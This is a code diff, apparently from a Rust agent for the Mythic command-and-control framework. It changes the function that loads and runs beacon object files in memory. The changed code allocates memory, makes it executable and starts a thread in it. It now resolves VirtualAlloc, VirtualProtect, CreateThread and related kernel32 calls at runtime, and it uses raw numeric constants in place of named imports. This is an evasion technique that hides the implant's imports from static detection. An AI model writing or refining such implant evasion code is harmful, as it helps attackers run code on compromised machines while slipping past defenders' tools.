@@ -123,11 +123,6 @@ pub fn bof(
     tx: &mpsc::Sender<serde_json::Value>,
     rx: mpsc::Receiver<serde_json::Value>,
 ) -> Result<(), Box<dyn Error>> {
-    use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect, VirtualFree};
-    use winapi::um::processthreadsapi::CreateThread;
-    use winapi::um::synchapi::WaitForSingleObject;
-    use winapi::um::handleapi::CloseHandle;
-    use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE, PAGE_EXECUTE_READ};
     use std::ptr;
 
     let task: AgentTask = serde_json::from_value(rx.recv()?)?;
@@ -163,7 +158,48 @@ pub fn bof(
     }
 
     unsafe {
-        let mem = VirtualAlloc(ptr::null_mut(), text_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        // Type definitions for dynamically resolved functions
+        type VirtualAllocFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
+        type VirtualProtectFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32, *mut u32) -> i32;
+        type VirtualFreeFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, u32) -> i32;
+        type CreateThreadFn = unsafe extern "system" fn(*mut std::ffi::c_void, usize, Option<unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
+        type WaitForSingleObjectFn = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
+        type CloseHandleFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;
+
+        // Dynamically resolve APIs
+        let virtual_alloc: VirtualAllocFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "VirtualAlloc")
+                .ok_or("VirtualAlloc resolve failed")?
+        );
+        let virtual_protect: VirtualProtectFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "VirtualProtect")
+                .ok_or("VirtualProtect resolve failed")?
+        );
+        let virtual_free: VirtualFreeFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree")
+                .ok_or("VirtualFree resolve failed")?
+        );
+        let create_thread: CreateThreadFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "CreateThread")
+                .ok_or("CreateThread resolve failed")?
+        );
+        let wait_for_single_object: WaitForSingleObjectFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "WaitForSingleObject")
+                .ok_or("WaitForSingleObject resolve failed")?
+        );
+        let close_handle: CloseHandleFn = std::mem::transmute(
+            crate::winapi_resolve::resolve("kernel32.dll", "CloseHandle")
+                .ok_or("CloseHandle resolve failed")?
+        );
+
+        // Use numeric constants instead of named winapi constants
+        const MEM_COMMIT: u32 = 0x1000;
+        const MEM_RESERVE: u32 = 0x2000;
+        const MEM_RELEASE: u32 = 0x8000;
+        const PAGE_READWRITE: u32 = 0x04;
+        const PAGE_EXECUTE_READ: u32 = 0x20;
+
+        let mem = virtual_alloc(ptr::null_mut(), text_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if mem.is_null() {
             tx.send(mythic_error!(task.id, "Memory allocation failed for BOF"))?;
             return Ok(());
@@ -172,15 +208,15 @@ pub fn bof(
         ptr::copy_nonoverlapping(text_data.as_ptr(), mem as *mut u8, text_size);
 
         let mut old_protect: u32 = 0;
-        if VirtualProtect(mem, text_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
-            VirtualFree(mem, 0, MEM_RELEASE);
+        if virtual_protect(mem, text_size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
+            virtual_free(mem, 0, MEM_RELEASE);
             tx.send(mythic_error!(task.id, "Memory protection change failed for BOF"))?;
             return Ok(());
         }
 
         let arg_bytes = arguments.as_bytes();
         let arg_mem = if !arg_bytes.is_empty() {
-            let a = VirtualAlloc(ptr::null_mut(), arg_bytes.len() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            let a = virtual_alloc(ptr::null_mut(), arg_bytes.len() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
             if !a.is_null() {
                 ptr::copy_nonoverlapping(arg_bytes.as_ptr(), a as *mut u8, arg_bytes.len());
                 *((a as *mut u8).add(arg_bytes.len())) = 0;
@@ -191,7 +227,7 @@ pub fn bof(
         };
 
         let mut thread_id: u32 = 0;
-        let thread = CreateThread(
+        let thread = create_thread(
             ptr::null_mut(),
             0,
             Some(std::mem::transmute(mem)),
@@ -201,18 +237,18 @@ pub fn bof(
         );
 
         if thread.is_null() {
-            VirtualFree(mem, 0, MEM_RELEASE);
-            if !arg_mem.is_null() { VirtualFree(arg_mem, 0, MEM_RELEASE); }
+            virtual_free(mem, 0, MEM_RELEASE);
+            if !arg_mem.is_null() { virtual_free(arg_mem, 0, MEM_RELEASE); }
             tx.send(mythic_error!(task.id, "Thread creation failed for BOF"))?;
             return Ok(());
         }
 
         // Wait up to 30 seconds
-        let wait = WaitForSingleObject(thread, 30000);
-        CloseHandle(thread);
+        let wait = wait_for_single_object(thread, 30000);
+        close_handle(thread);
 
-        VirtualFree(mem, 0, MEM_RELEASE);
-        if !arg_mem.is_null() { VirtualFree(arg_mem, 0, MEM_RELEASE); }
+        virtual_free(mem, 0, MEM_RELEASE);
+        if !arg_mem.is_null() { virtual_free(arg_mem, 0, MEM_RELEASE); }
 
         let status = if wait == 0 { "completed" } else { "timed out (30s)" };
         tx.send(mythic_success!(task.id, format!(
